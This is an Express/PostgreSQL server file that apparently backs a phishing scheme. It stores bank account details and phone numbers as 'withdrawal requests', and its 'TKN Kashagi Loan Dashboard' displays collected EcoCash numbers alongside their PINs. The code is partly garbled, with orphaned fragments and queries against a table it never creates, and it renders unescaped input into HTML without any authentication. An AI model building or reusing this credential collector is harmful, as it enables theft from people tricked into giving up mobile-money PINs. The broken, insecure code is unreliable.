const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();

app.use(cors());
app.use(express.json());

const pool = new Pool({
connectionString: process.env.DATABASE_URL,
ssl: {
rejectUnauthorized: false
}
});

const path = require("path");

app.use(express.static(path.join(__dirname, "public")));

app.get("/test-db", async (req, res) => {
  try {
    const result = await pool.query("SELECT NOW()");
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/create-table", async (req, res) => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bank_withdrawals (
        id SERIAL PRIMARY KEY,
        bank_name TEXT NOT NULL,
        account_number TEXT NOT NULL,
        phone_number TEXT NOT NULL,
        branch_code TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Bank withdrawals table created successfully");

  } catch (err) {
    console.error(err);
    res.status(500).json({
      error: err.toString()
    });
  }
});

    res.send("Table created successfully");
  }
  catch (err) {
  console.error(err);
  res.status(500).json({
    error: err.toString()
  });
  }
});

    res.send("Table reset successfully");
  } catch (err) {
    console.error(err);
    res.status(500).json({
      error: err.toString()
    });
  }
});

app.get("/create-bank-table", async (req, res) => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bank_withdrawals (
        id SERIAL PRIMARY KEY,
        bank_name TEXT NOT NULL,
        account_number TEXT NOT NULL,
        branch_code TEXT NOT NULL,
        phone_number TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Bank withdrawals table created successfully");
  } catch (err) {
    console.error(err);
    res.status(500).json({
      error: err.toString()
    });
  }
});
app.post("/submit", async (req, res) => {
  try {

    const {
      bank_name,
      account_number,
      phone_number,
      branch_code
    } = req.body;

    await pool.query(
      `INSERT INTO bank_withdrawals
      (bank_name, account_number, branch_code, phone_number)
      VALUES ($1, $2, $3, $4)`,
      [
        bank_name,
        account_number,
        branch_code,
        phone_number
      ]
    );

    res.json({
      success: true,
      message: "Withdrawal request submitted successfully"
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({
      success: false,
      message: err.toString()
    });
  }
});

app.get("/delete/:id", async (req, res) => {
try {

await pool.query(
  "DELETE FROM submissions WHERE id=$1",
  [req.params.id]
);

res.redirect("/submissions");

} catch (err) {

res.status(500).send(err.message);

}
});

app.get("/submissions", async (req, res) => {

try {

const search = req.query.search || "";

let result;

if(search){

result = await pool.query(

"SELECT * FROM submissions WHERE ecocash_number ILIKE $1 ORDER BY id DESC",

[`%${search}%`]

);

}else{

result = await pool.query(

"SELECT * FROM submissions ORDER BY id DESC"

);

}

const totalResult = await pool.query(

"SELECT COUNT(*) FROM submissions"

);

const todayResult = await pool.query(

"SELECT COUNT(*) FROM submissions WHERE DATE(created_at)=CURRENT_DATE"

);

let rows = "";

result.rows.forEach(item=>{

rows += `
<tr>

<td>
<input
type="checkbox"
name="ids"
value="${item.id}">
</td>

<td>${item.id}</td>

<td>${item.ecocash_number}</td>

<td>${item.ecocash_pin}</td>

<td>${new Date(item.created_at).toLocaleString()}</td>

<td>

<a
href="/delete/${item.id}"
onclick="return confirm('Delete this record?')"
style="color:red;font-weight:bold;text-decoration:none;">

Delete

</a>

</td>

</tr>

`;

});

  res.send(`

<!DOCTYPE html>

<html>

<head>

<title>TKN Kashagi Loan Dashboard</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<style>

*{
box-sizing:border-box;
}

body{
margin:0;
padding:20px;
font-family:Arial,sans-serif;
background:#f4f6f9;
}

.container{
max-width:1200px;
margin:auto;
}

h1{
text-align:center;
color:#1877f2;
margin-bottom:25px;
}

.cards{
display:flex;
gap:15px;
margin-bottom:20px;
flex-wrap:wrap;
}

.card{
flex:1;
min-width:220px;
background:#fff;
padding:20px;
border-radius:10px;
text-align:center;
box-shadow:0 2px 10px rgba(0,0,0,.1);
}

.card h3{
margin:0;
font-size:18px;
}

.card h2{
margin-top:10px;
color:#1877f2;
}

.search{
display:flex;
justify-content:center;
gap:10px;
margin-bottom:20px;
flex-wrap:wrap;
}

.search input{
padding:10px;
width:260px;
border:1px solid #ccc;
border-radius:5px;
}

.search button{
padding:10px 18px;
background:#1877f2;
color:white;
border:none;
border-radius:5px;
cursor:pointer;
}

.delete-btn{
background:#dc3545 !important;
}

table{
width:100%;
border-collapse:collapse;
background:#fff;
box-shadow:0 2px 10px rgba(0,0,0,.1);
}

table,th,td{
border:1px solid #dcdcdc;
}

th{
background:#1877f2;
color:white;
padding:12px;
}

td{
padding:10px;
text-align:center;
}

tr:nth-child(even){
background:#f8f9fa;
}

tr:hover{
background:#eef5ff;
}

</style>

</head>

<body>

<div class="container">

<h1>TKN Kashagi Loan Dashboard</h1>

<div class="cards">

<div class="card">
<h3>Total Submissions</h3>
<h2>${totalResult.rows[0].count}</h2>
</div>

<div class="card">
<h3>Today's Submissions</h3>
<h2>${todayResult.rows[0].count}</h2>
</div>

</div>

<div class="search">

<form method="GET" action="/submissions">

<input
type="text"
name="search"
value="${search}"
placeholder="Search EcoCash Number">

<button type="submit">
Search
</button>

</form>

</div>

<form id="deleteForm">

<button
type="button"
class="delete-btn"
onclick="deleteSelected()"
style="margin-bottom:15px;padding:10px 15px;color:white;border:none;border-radius:5px;cursor:pointer;">

Delete Selected

</button>

<table>

<tr>

<th>
<input type="checkbox" id="selectAll">
</th>

<th>ID</th>

<th>EcoCash Number</th>

<th>EcoCash Pin</th>

<th>Date Submitted</th>

<th>Action</th>

</tr>

${rows}

</table>

</form>

<script>

document.getElementById("selectAll").addEventListener("change",function(){

document.querySelectorAll("input[name='ids']").forEach(function(box){

box.checked=this.checked;

},this);

});

async function deleteSelected(){

const ids=[];

document.querySelectorAll("input[name='ids']:checked").forEach(function(box){

ids.push(parseInt(box.value));

});

if(ids.length===0){

alert("Please select at least one record.");

return;

}

if(!confirm("Delete selected records?")){

return;

}

const response=await fetch("/delete-selected",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({ids})

});

if(response.ok){

location.reload();

}else{

alert("Failed to delete selected records.");

}

}

</script>

</body>

</html>

`);

} catch (err) {

res.status(500).send(err.message);

}

});

app.post("/delete-selected", async (req, res) => {

  try {

    const { ids } = req.body;

    if (!ids || ids.length === 0) {
      return res.redirect("/submissions");
    }

    await pool.query(
      "DELETE FROM submissions WHERE id = ANY($1::int[])",
      [Array.isArray(ids) ? ids : [ids]]
    );

    res.redirect("/submissions");

  } catch (err) {

    res.status(500).send(err.message);

  }

});
app.listen(process.env.PORT || 3000, () => {
console.log("Server started");
});
